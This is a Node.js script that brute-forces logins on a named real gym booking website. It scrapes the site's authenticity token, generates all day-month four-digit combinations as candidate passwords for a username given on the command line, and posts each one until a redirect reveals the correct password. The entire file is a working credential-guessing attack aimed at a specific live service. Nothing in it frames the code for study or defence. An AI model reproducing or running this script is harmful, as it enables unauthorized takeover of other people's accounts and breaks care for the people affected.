var request = require('request');
var cheerio = require('cheerio');
var Q = require('q');
var _ = require('lodash');
var chalk = require('chalk');

var username = process.argv[2];
init(username);

function init(username) {
	var cookieJar = request.jar();

	if (username) {
		printNormal('Finding password for: ', chalk.bold(username));
	} else {
		printWarning('You must specify a username!');
		return;
	}

	request({
		url: 'http://www.crossfitcopenhagen.dk/booking',
		jar: cookieJar,
	}, function(error, response, body) {
		if (error) {
			printWarning('Could not initialize ', error);
			return;
		}

		var $ = cheerio.load(body);
		var authenticityToken = $('input[name="authenticity_token"]').val();

		var passwords = getPossiblePasswords();
		asyncReduce(passwords, function(password) {
			printNormal(password);
			return attemptLogin(username, password, authenticityToken, cookieJar);
		}).then(function(password) {
			printSuccess('Correct password: ', password);
		})
		.done();
	});
}

function attemptLogin(username, password, authenticityToken, cookieJar) {
	return Q.Promise(function(resolve, reject) {
		request({
			method: 'POST',
			url: 'http://www.crossfitcopenhagen.dk/sessions',
			jar: cookieJar,
			form: {
				authenticity_token: authenticityToken,
				username: username,
				password: password,
			},
		}, function(error, response) {
			if (error) {
				reject(error);
			} else {
				var isLoggedIn = response.statusCode === 302;
				resolve(isLoggedIn);
			}
		});
	})
	.catch(function(errorMessage) {
		printWarning('Error occured while attempting', password, errorMessage);
	});
}

function asyncReduce(items, fn) {
	function next(index) {
		var item = items[index];
		return fn(item).then(function(isSuccess) {
			return isSuccess ? item : next(++index);
		});
	}

	return next(0);
}

function getPossiblePasswords() {
	var months = _.range(1, 13);
	var days = _.range(1, 32);
	var passwords = [];

	_.each(months, function(month) {
		month = _.padLeft(month, 2, '0');
		_.each(days, function(day) {
			day = _.padLeft(day, 2, '0');
			var password = day + month;
			passwords.push(password);
		});
	});

	return passwords;
}

function printWarning() {
	var colored = chalk.red.apply(chalk, arguments);
	console.warn(colored);
}

function printSuccess() {
	var colored = chalk.green.apply(chalk, arguments);
	console.log(colored);
}

function printNormal() {
	console.log.apply(console, arguments);
}
